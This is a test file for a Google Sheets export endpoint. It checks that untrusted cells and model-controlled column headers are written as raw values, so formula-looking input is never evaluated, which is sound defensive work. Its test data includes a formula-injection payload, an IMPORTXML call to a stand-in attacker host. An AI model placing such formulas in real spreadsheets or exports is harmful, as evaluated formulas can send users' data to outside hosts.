import { beforeEach, describe, expect, it, vi } from 'vitest'

const googleFetchMock = vi.hoisted(() => vi.fn())

vi.mock('../../../functions/api/_lib/checkAllowedUser', () => ({
  verifyGoogleUser: vi.fn(async () => 'owner@example.com'),
  notFoundResponse: () => Response.json({ error: 'Not found' }, { status: 404 }),
}))
vi.mock('../../../functions/api/_lib/googleFetch', () => ({
  googleFetch: googleFetchMock,
}))

import { onRequestPost } from '../../../functions/api/sheets/append'

function request(body: Record<string, unknown>): Request {
  return new Request('https://tryarty.com/api/sheets/append', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-google-token': 'tok' },
    body: JSON.stringify(body),
  })
}

describe('Sheets export uses RAW for untrusted cells', () => {
  beforeEach(() => googleFetchMock.mockReset())

  it('appends formula-looking data without asking Sheets to evaluate it', async () => {
    googleFetchMock.mockResolvedValueOnce(new Response(JSON.stringify({ updates: { updatedRows: 1 } }), { status: 200 }))
    const values = [['=IMPORTXML("https://attacker.example")', '+1+1', '@SUM(A1:A2)']]
    const res = await onRequestPost({
      request: request({ action: 'append', spreadsheetId: 'sheet_123', sheetName: 'Clients', values }),
    } as never)
    expect(res.status).toBe(200)
    const [url, init] = googleFetchMock.mock.calls[0] as [string, RequestInit]
    expect(url).toContain('valueInputOption=RAW')
    expect(JSON.parse(String(init.body))).toEqual({ values })
  })

  it('also writes model-controlled column headers as RAW', async () => {
    googleFetchMock
      .mockResolvedValueOnce(new Response(JSON.stringify({ spreadsheetId: 'new_sheet' }), { status: 200 }))
      .mockResolvedValueOnce(new Response(JSON.stringify({ updates: {} }), { status: 200 }))
    const res = await onRequestPost({
      request: request({ action: 'create', title: 'Export', headers: ['=1+1', 'Client'] }),
    } as never)
    expect(res.status).toBe(200)
    expect(String(googleFetchMock.mock.calls[1]?.[0])).toContain('valueInputOption=RAW')
  })
})
